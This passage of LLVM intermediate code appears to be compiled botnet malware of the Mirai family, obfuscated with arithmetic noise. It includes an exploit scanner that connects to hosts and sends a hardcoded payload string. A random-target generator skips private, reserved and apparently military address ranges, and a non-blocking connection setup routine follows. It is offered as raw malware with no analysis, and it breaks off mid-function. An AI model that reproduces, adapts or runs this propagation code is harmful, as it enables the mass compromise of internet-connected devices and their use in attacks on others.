; <label>:713:                                    ; preds = %705
  %714 = load i32, i32* %30, align 4
  %715 = icmp eq i32 %714, 0
  br i1 %715, label %716, label %765

; <label>:716:                                    ; preds = %713
  %717 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %718 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %717, i32 0, i32 2
  %719 = load i32, i32* %718, align 8
  %720 = icmp eq i32 %719, 3
  br i1 %720, label %721, label %746

; <label>:721:                                    ; preds = %716
  %722 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %723 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %722, i32 0, i32 8
  %724 = getelementptr inbounds [2560 x i8], [2560 x i8]* %723, i32 0, i32 0
  %725 = call i32 @util_strcpy(i8* %724, i8* getelementptr inbounds ([920 x i8], [920 x i8]* @.str.73, i32 0, i32 0))
  %726 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %727 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %726, i32 0, i32 0
  %728 = load i32, i32* %727, align 8
  %729 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %730 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %729, i32 0, i32 8
  %731 = getelementptr inbounds [2560 x i8], [2560 x i8]* %730, i32 0, i32 0
  %732 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %733 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %732, i32 0, i32 8
  %734 = getelementptr inbounds [2560 x i8], [2560 x i8]* %733, i32 0, i32 0
  %735 = call i32 @util_strlen(i8* %734)
  %736 = sext i32 %735 to i64
  %737 = call i64 @send(i32 %728, i8* %731, i64 %736, i32 16384)
  %738 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %739 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %738, i32 0, i32 8
  %740 = getelementptr inbounds [2560 x i8], [2560 x i8]* %739, i32 0, i32 0
  call void @util_zero(i8* %740, i32 2560)
  %741 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %742 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %741, i32 0, i32 6
  %743 = getelementptr inbounds [256 x i8], [256 x i8]* %742, i32 0, i32 0
  call void @util_zero(i8* %743, i32 256)
  %744 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %745 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %744, i32 0, i32 2
  store i32 4, i32* %745, align 8
  br label %908

; <label>:746:                                    ; preds = %716
  %747 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %748 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %747, i32 0, i32 2
  %749 = load i32, i32* %748, align 8
  %750 = icmp eq i32 %749, 4
  br i1 %750, label %751, label %760

; <label>:751:                                    ; preds = %746
  %752 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %753 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %752, i32 0, i32 0
  %754 = load i32, i32* %753, align 8
  %755 = call i32 @close(i32 %754)
  %756 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %757 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %756, i32 0, i32 0
  store i32 -1, i32* %757, align 8
  %758 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %759 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %758, i32 0, i32 2
  store i32 0, i32* %759, align 8
  br label %908

; <label>:760:                                    ; preds = %746
  %761 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %762 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %761, i32 0, i32 2
  store i32 3, i32* %762, align 8
  br label %763

; <label>:763:                                    ; preds = %760
  br label %764

; <label>:764:                                    ; preds = %763
  br label %774

; <label>:765:                                    ; preds = %713, %705
  %766 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %767 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %766, i32 0, i32 0
  %768 = load i32, i32* %767, align 8
  %769 = call i32 @close(i32 %768)
  %770 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %771 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %770, i32 0, i32 0
  store i32 -1, i32* %771, align 8
  %772 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %773 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %772, i32 0, i32 2
  store i32 0, i32* %773, align 8
  br label %908

; <label>:774:                                    ; preds = %764
  br label %775

; <label>:775:                                    ; preds = %774, %681
  %776 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %777 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %778 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %777, i32 0, i32 0
  %779 = load i32, i32* %778, align 8
  %780 = sdiv i32 %779, 64
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds [16 x i64], [16 x i64]* %776, i64 0, i64 %781
  %783 = load i64, i64* %782, align 8
  %784 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %785 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %784, i32 0, i32 0
  %786 = load i32, i32* %785, align 8
  %787 = srem i32 %786, 64
  %788 = zext i32 %787 to i64
  %789 = shl i64 1, %788
  %790 = xor i64 %783, -1
  %791 = xor i64 %789, -1
  %792 = xor i64 3298212607643454603, -1
  %793 = or i64 %790, %791
  %794 = or i64 3298212607643454603, %792
  %795 = xor i64 %793, -1
  %796 = and i64 %795, %794
  %797 = and i64 %783, %789
  %798 = icmp ne i64 %796, 0
  br i1 %798, label %799, label %907

; <label>:799:                                    ; preds = %775
  br label %800

; <label>:800:                                    ; preds = %886, %867, %799
  store i32 0, i32* %32, align 4
  %801 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %802 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %801, i32 0, i32 2
  %803 = load i32, i32* %802, align 8
  %804 = icmp eq i32 %803, 0
  br i1 %804, label %805, label %806

; <label>:805:                                    ; preds = %800
  br label %906

; <label>:806:                                    ; preds = %800
  %807 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %808 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %807, i32 0, i32 5
  %809 = load i32, i32* %808, align 4
  %810 = icmp eq i32 %809, 256
  br i1 %810, label %811, label %826

; <label>:811:                                    ; preds = %806
  %812 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %813 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %812, i32 0, i32 6
  %814 = getelementptr inbounds [256 x i8], [256 x i8]* %813, i32 0, i32 0
  %815 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %816 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %815, i32 0, i32 6
  %817 = getelementptr inbounds [256 x i8], [256 x i8]* %816, i32 0, i32 0
  %818 = getelementptr inbounds i8, i8* %817, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %814, i8* %818, i64 192, i32 1, i1 false)
  %819 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %820 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %819, i32 0, i32 5
  %821 = load i32, i32* %820, align 4
  %822 = sub i32 %821, 2140007685
  %823 = sub i32 %822, 64
  %824 = add i32 %823, 2140007685
  %825 = sub nsw i32 %821, 64
  store i32 %824, i32* %820, align 4
  br label %826

; <label>:826:                                    ; preds = %811, %806
  %827 = call i32* @__errno_location() #9
  store i32 0, i32* %827, align 4
  %828 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %829 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %828, i32 0, i32 0
  %830 = load i32, i32* %829, align 8
  %831 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %832 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %831, i32 0, i32 6
  %833 = getelementptr inbounds [256 x i8], [256 x i8]* %832, i32 0, i32 0
  %834 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %835 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %834, i32 0, i32 5
  %836 = load i32, i32* %835, align 4
  %837 = sext i32 %836 to i64
  %838 = getelementptr inbounds i8, i8* %833, i64 %837
  %839 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %840 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %839, i32 0, i32 5
  %841 = load i32, i32* %840, align 4
  %842 = add i32 256, -675799074
  %843 = sub i32 %842, %841
  %844 = sub i32 %843, -675799074
  %845 = sub nsw i32 256, %841
  %846 = call i32 @exploit_recv_strip_null(i32 %830, i8* %838, i32 %844, i32 16384)
  store i32 %846, i32* %32, align 4
  %847 = load i32, i32* %32, align 4
  %848 = icmp eq i32 %847, 0
  br i1 %848, label %849, label %851

; <label>:849:                                    ; preds = %826
  %850 = call i32* @__errno_location() #9
  store i32 104, i32* %850, align 4
  store i32 -1, i32* %32, align 4
  br label %851

; <label>:851:                                    ; preds = %849, %826
  %852 = load i32, i32* %32, align 4
  %853 = icmp eq i32 %852, -1
  br i1 %853, label %854, label %886

; <label>:854:                                    ; preds = %851
  %855 = call i32* @__errno_location() #9
  %856 = load i32, i32* %855, align 4
  %857 = icmp ne i32 %856, 11
  br i1 %857, label %858, label %885

; <label>:858:                                    ; preds = %854
  %859 = call i32* @__errno_location() #9
  %860 = load i32, i32* %859, align 4
  %861 = icmp ne i32 %860, 11
  br i1 %861, label %862, label %885

; <label>:862:                                    ; preds = %858
  %863 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %864 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %863, i32 0, i32 2
  %865 = load i32, i32* %864, align 8
  %866 = icmp eq i32 %865, 3
  br i1 %866, label %867, label %873

; <label>:867:                                    ; preds = %862
  %868 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %869 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %868, i32 0, i32 0
  %870 = load i32, i32* %869, align 8
  %871 = call i32 @close(i32 %870)
  %872 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  call void @exploit_setup_connection(%struct.exploit_scanner_connection* %872)
  br label %800

; <label>:873:                                    ; preds = %862
  %874 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %875 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %874, i32 0, i32 0
  %876 = load i32, i32* %875, align 8
  %877 = call i32 @close(i32 %876)
  %878 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %879 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %878, i32 0, i32 0
  store i32 -1, i32* %879, align 8
  %880 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %881 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %880, i32 0, i32 2
  store i32 0, i32* %881, align 8
  %882 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %883 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %882, i32 0, i32 6
  %884 = getelementptr inbounds [256 x i8], [256 x i8]* %883, i32 0, i32 0
  call void @util_zero(i8* %884, i32 256)
  br label %885

; <label>:885:                                    ; preds = %873, %858, %854
  br label %906

; <label>:886:                                    ; preds = %851
  %887 = load i32, i32* %32, align 4
  %888 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %889 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %888, i32 0, i32 5
  %890 = load i32, i32* %889, align 4
  %891 = sub i32 0, %887
  %892 = sub i32 %890, %891
  %893 = add nsw i32 %890, %887
  store i32 %892, i32* %889, align 4
  %894 = load i32, i32* @exploit_fake_time, align 4
  %895 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %896 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %895, i32 0, i32 1
  store i32 %894, i32* %896, align 4
  %897 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %898 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %897, i32 0, i32 6
  %899 = getelementptr inbounds [256 x i8], [256 x i8]* %898, i32 0, i32 0
  %900 = call i32 @util_strlen(i8* %899)
  store i32 %900, i32* %33, align 4
  %901 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %902 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %901, i32 0, i32 6
  %903 = load i32, i32* %33, align 4
  %904 = sext i32 %903 to i64
  %905 = getelementptr inbounds [256 x i8], [256 x i8]* %902, i64 0, i64 %904
  store i8 0, i8* %905, align 1
  br label %800

; <label>:906:                                    ; preds = %885, %805
  br label %907

; <label>:907:                                    ; preds = %906, %775
  br label %908

; <label>:908:                                    ; preds = %907, %765, %751, %721, %680
  %909 = load i32, i32* %1, align 4
  %910 = add i32 %909, 2043238097
  %911 = add i32 %910, 1
  %912 = sub i32 %911, 2043238097
  %913 = add nsw i32 %909, 1
  store i32 %912, i32* %1, align 4
  br label %668

; <label>:914:                                    ; preds = %668
  br label %238
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  store i8 0, i8* %2, align 1
  store i8 0, i8* %3, align 1
  store i8 0, i8* %4, align 1
  store i8 0, i8* %5, align 1
  br label %6

; <label>:6:                                      ; preds = %183, %0
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = call i64 @time(i64* null) #6
  %9 = trunc i64 %8 to i32
  call void @srand(i32 %9) #6
  %10 = load i32, i32* %1, align 4
  %11 = xor i32 %10, -1
  %12 = xor i32 255, -1
  %13 = xor i32 1345413501, -1
  %14 = or i32 %11, %12
  %15 = or i32 1345413501, %13
  %16 = xor i32 %14, -1
  %17 = and i32 %16, %15
  %18 = and i32 %10, 255
  %19 = trunc i32 %17 to i8
  store i8 %19, i8* %2, align 1
  %20 = load i32, i32* %1, align 4
  %21 = lshr i32 %20, 8
  %22 = xor i32 %21, -1
  %23 = xor i32 255, -1
  %24 = xor i32 1817921170, -1
  %25 = or i32 %22, %23
  %26 = or i32 1817921170, %24
  %27 = xor i32 %25, -1
  %28 = and i32 %27, %26
  %29 = and i32 %21, 255
  %30 = trunc i32 %28 to i8
  store i8 %30, i8* %3, align 1
  %31 = load i32, i32* %1, align 4
  %32 = lshr i32 %31, 16
  %33 = xor i32 255, -1
  %34 = xor i32 %32, %33
  %35 = and i32 %34, %32
  %36 = and i32 %32, 255
  %37 = trunc i32 %35 to i8
  store i8 %37, i8* %4, align 1
  %38 = load i32, i32* %1, align 4
  %39 = lshr i32 %38, 24
  %40 = xor i32 255, -1
  %41 = xor i32 %39, %40
  %42 = and i32 %41, %39
  %43 = and i32 %39, 255
  %44 = trunc i32 %42 to i8
  store i8 %44, i8* %5, align 1
  br label %45

; <label>:45:                                     ; preds = %6
  %46 = load i8, i8* %2, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp eq i32 %47, 127
  br i1 %48, label %183, label %49

; <label>:49:                                     ; preds = %45
  %50 = load i8, i8* %2, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %183, label %53

; <label>:53:                                     ; preds = %49
  %54 = load i8, i8* %2, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 3
  br i1 %56, label %183, label %57

; <label>:57:                                     ; preds = %53
  %58 = load i8, i8* %2, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 15
  br i1 %60, label %183, label %61

; <label>:61:                                     ; preds = %57
  %62 = load i8, i8* %2, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 16
  br i1 %64, label %183, label %65

; <label>:65:                                     ; preds = %61
  %66 = load i8, i8* %2, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp eq i32 %67, 56
  br i1 %68, label %183, label %69

; <label>:69:                                     ; preds = %65
  %70 = load i8, i8* %2, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 10
  br i1 %72, label %183, label %73

; <label>:73:                                     ; preds = %69
  %74 = load i8, i8* %2, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 192
  br i1 %76, label %77, label %81

; <label>:77:                                     ; preds = %73
  %78 = load i8, i8* %3, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %79, 168
  br i1 %80, label %183, label %81

; <label>:81:                                     ; preds = %77, %73
  %82 = load i8, i8* %2, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 172
  br i1 %84, label %85, label %93

; <label>:85:                                     ; preds = %81
  %86 = load i8, i8* %3, align 1
  %87 = zext i8 %86 to i32
  %88 = icmp sge i32 %87, 16
  br i1 %88, label %89, label %93

; <label>:89:                                     ; preds = %85
  %90 = load i8, i8* %3, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %91, 32
  br i1 %92, label %183, label %93

; <label>:93:                                     ; preds = %89, %85, %81
  %94 = load i8, i8* %2, align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 100
  br i1 %96, label %97, label %105

; <label>:97:                                     ; preds = %93
  %98 = load i8, i8* %3, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp sge i32 %99, 64
  br i1 %100, label %101, label %105

; <label>:101:                                    ; preds = %97
  %102 = load i8, i8* %3, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp slt i32 %103, 127
  br i1 %104, label %183, label %105

; <label>:105:                                    ; preds = %101, %97, %93
  %106 = load i8, i8* %2, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 169
  br i1 %108, label %109, label %113

; <label>:109:                                    ; preds = %105
  %110 = load i8, i8* %3, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp sgt i32 %111, 254
  br i1 %112, label %183, label %113

; <label>:113:                                    ; preds = %109, %105
  %114 = load i8, i8* %2, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 198
  br i1 %116, label %117, label %125

; <label>:117:                                    ; preds = %113
  %118 = load i8, i8* %3, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp sge i32 %119, 18
  br i1 %120, label %121, label %125

; <label>:121:                                    ; preds = %117
  %122 = load i8, i8* %3, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 20
  br i1 %124, label %183, label %125

; <label>:125:                                    ; preds = %121, %117, %113
  %126 = load i8, i8* %2, align 1
  %127 = zext i8 %126 to i32
  %128 = icmp sge i32 %127, 224
  br i1 %128, label %183, label %129

; <label>:129:                                    ; preds = %125
  %130 = load i8, i8* %2, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 6
  br i1 %132, label %181, label %133

; <label>:133:                                    ; preds = %129
  %134 = load i8, i8* %2, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 7
  br i1 %136, label %181, label %137

; <label>:137:                                    ; preds = %133
  %138 = load i8, i8* %2, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 11
  br i1 %140, label %181, label %141

; <label>:141:                                    ; preds = %137
  %142 = load i8, i8* %2, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 21
  br i1 %144, label %181, label %145

; <label>:145:                                    ; preds = %141
  %146 = load i8, i8* %2, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 22
  br i1 %148, label %181, label %149

; <label>:149:                                    ; preds = %145
  %150 = load i8, i8* %2, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 26
  br i1 %152, label %181, label %153

; <label>:153:                                    ; preds = %149
  %154 = load i8, i8* %2, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 28
  br i1 %156, label %181, label %157

; <label>:157:                                    ; preds = %153
  %158 = load i8, i8* %2, align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 29
  br i1 %160, label %181, label %161

; <label>:161:                                    ; preds = %157
  %162 = load i8, i8* %2, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 30
  br i1 %164, label %181, label %165

; <label>:165:                                    ; preds = %161
  %166 = load i8, i8* %2, align 1
  %167 = zext i8 %166 to i32
  %168 = icmp eq i32 %167, 33
  br i1 %168, label %181, label %169

; <label>:169:                                    ; preds = %165
  %170 = load i8, i8* %2, align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 55
  br i1 %172, label %181, label %173

; <label>:173:                                    ; preds = %169
  %174 = load i8, i8* %2, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp eq i32 %175, 214
  br i1 %176, label %181, label %177

; <label>:177:                                    ; preds = %173
  %178 = load i8, i8* %2, align 1
  %179 = zext i8 %178 to i32
  %180 = icmp eq i32 %179, 215
  br label %181

; <label>:181:                                    ; preds = %177, %173, %169, %165, %161, %157, %153, %149, %145, %141, %137, %133, %129
  %182 = phi i1 [ true, %173 ], [ true, %169 ], [ true, %165 ], [ true, %161 ], [ true, %157 ], [ true, %153 ], [ true, %149 ], [ true, %145 ], [ true, %141 ], [ true, %137 ], [ true, %133 ], [ true, %129 ], [ %180, %177 ]
  br label %183

; <label>:183:                                    ; preds = %181, %125, %121, %109, %101, %89, %77, %69, %65, %61, %57, %53, %49, %45
  %184 = phi i1 [ true, %125 ], [ true, %121 ], [ true, %109 ], [ true, %101 ], [ true, %89 ], [ true, %77 ], [ true, %69 ], [ true, %65 ], [ true, %61 ], [ true, %57 ], [ true, %53 ], [ true, %49 ], [ true, %45 ], [ %182, %181 ]
  br i1 %184, label %6, label %185

; <label>:185:                                    ; preds = %183
  %186 = load i8, i8* %2, align 1
  %187 = zext i8 %186 to i32
  %188 = shl i32 %187, 24
  %189 = load i8, i8* %3, align 1
  %190 = zext i8 %189 to i32
  %191 = shl i32 %190, 16
  %192 = and i32 %188, %191
  %193 = xor i32 %188, %191
  %194 = or i32 %192, %193
  %195 = or i32 %188, %191
  %196 = load i8, i8* %4, align 1
  %197 = zext i8 %196 to i32
  %198 = shl i32 %197, 8
  %199 = and i32 %194, %198
  %200 = xor i32 %194, %198
  %201 = or i32 %199, %200
  %202 = or i32 %194, %198
  %203 = load i8, i8* %5, align 1
  %204 = zext i8 %203 to i32
  %205 = shl i32 %204, 0
  %206 = and i32 %201, %205
  %207 = xor i32 %201, %205
  %208 = or i32 %206, %207
  %209 = or i32 %201, %205
  %210 = call i32 @htonl(i32 %208) #9
  ret i32 %210
}

declare zeroext i16 @checksum_generic(i16*, i32) #5

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #5

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #5

; Function Attrs: noinline nounwind uwtable
define internal void @exploit_setup_connection(%struct.exploit_scanner_connection*) #0 {
  %2 = alloca %struct.exploit_scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.exploit_scanner_connection* %0, %struct.exploit_scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %6, i32 0, i32 0
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %11, i32 0, i32 0
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %86

; <label>:21:                                     ; preds = %15
  %22 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %22, i32 0, i32 5
  store i32 0, i32* %23, align 4
  %24 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %24, i32 0, i32 6
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %27, i32 0, i32 0
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = xor i32 2048, -1
  %35 = xor i32 %33, -1
  %36 = xor i32 1414081575, -1
  %37 = and i32 %34, 1414081575
  %38 = and i32 2048, %36
  %39 = and i32 %35, 1414081575
  %40 = and i32 %33, %36
  %41 = or i32 %37, %38
  %42 = or i32 %39, %40
  %43 = xor i32 %41, %42
  %44 = or i32 %34, %35
  %45 = xor i32 %44, -1
  %46 = or i32 1414081575, %36
  %47 = and i32 %45, %46
  %48 = or i32 %43, %47
  %49 = or i32 2048, %33
  %50 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %48)
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %51, align 4
  %52 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %53 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %52, i32 0, i32 3
  %54 = load i32, i32* %53, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %56 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %55, i32 0, i32 0
  store i32 %54, i32* %56, align 4
  %57 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %58 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %57, i32 0, i32 4
  %59 = load i16, i16* %58, align 8
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %59, i16* %60, align 2
  %61 = load i32, i32* @exploit_fake_time, align 4
  %62 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %63 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %62, i32 0, i32 1
  store i32 %61, i32* %63, align 4
  %64 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %65 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %64, i32 0, i32 2
  %66 = load i32, i32* %65, align 8
  %67 = icmp eq i32 %66, 3
  br i1 %67, label %73, label %68

; <label>:68:                                     ; preds = %21
  %69 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
